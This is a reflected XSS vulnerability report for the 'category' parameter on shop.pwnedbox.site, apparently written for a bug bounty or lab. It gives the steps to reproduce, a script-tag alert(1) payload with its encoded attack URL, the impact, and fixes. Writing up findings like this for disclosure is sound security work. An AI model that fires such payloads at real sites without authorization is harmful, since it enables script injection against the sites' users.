## Title
Reflected XSS - shop.pwnedbox.site

## Description
The `category` GET parameter on `shop.pwnedbox.site` was found vulnerable to Reflected Cross-Site Scripting (XSS). The parameter was identified by clicking the Physics category, and a crafted JavaScript payload successfully triggered an `alert(1)` dialog in the browser.

## Steps to Reproduce

1. Open the target website:
   ```text
   https://shop.pwnedbox.site/
   ```

2. Navigate to the product categories and click on **Physics**.

3. Observe that the URL changes to the following format:
   ```text
   https://shop.pwnedbox.site/index.php?category=physics
   ```

4. Replace the existing `category` value with the following crafted XSS payload:
   ```html
   hakama'"><><sCrIpT>alert(1)</sCrIpT>
   ```

5. Open the modified URL in a browser:
   ```text
   https://shop.pwnedbox.site/index.php?category=hakama%27%22%3C%3E%3CsCrIpT%3Ealert(1)%3C/sCrIpT%3E
   ```

6. Allow the page to load and observe the JavaScript alert dialog displaying `1`.

7. Dismiss the alert dialog.

## POC (Proof of Concept)

**Target URL:**  
https://shop.pwnedbox.site/

**HTTP Method:** GET

**Vulnerable Parameter:** `category`

**Parameter Discovery:** Clicked on the Physics category, which generated the `category` parameter in the URL.

**Original URL:**
```text
https://shop.pwnedbox.site/index.php?category=physics
```

**Payload:**
```html
hakama'"><><sCrIpT>alert(1)</sCrIpT>
```

**Crafted Request URL:**
```text
https://shop.pwnedbox.site/index.php?category=hakama%27%22%3C%3E%3CsCrIpT%3Ealert(1)%3C/sCrIpT%3E
```

**Observed Result:**

The supplied JavaScript payload was successfully executed through the `category` parameter. The browser displayed an alert dialog containing `1`, confirming Reflected Cross-Site Scripting (XSS).

**Screenshot:**

<img width="1920" height="1200" alt="image" src="https://github.com/user-attachments/assets/832b24b4-d535-41ea-a2b6-86018af51c8f" />

## Impact

- An attacker can craft a malicious URL and trick victims into opening it.
- Successful exploitation allows JavaScript execution in the victim's browser.
- The vulnerability may be abused for phishing or manipulation of displayed webpage content.

## Remediation

- Apply context-aware output encoding to the `category` parameter before rendering its value in HTML.
- Validate and sanitize user-controlled input to prevent HTML and JavaScript injection.
- Implement a restrictive Content Security Policy (CSP) to block unauthorized inline JavaScript execution.
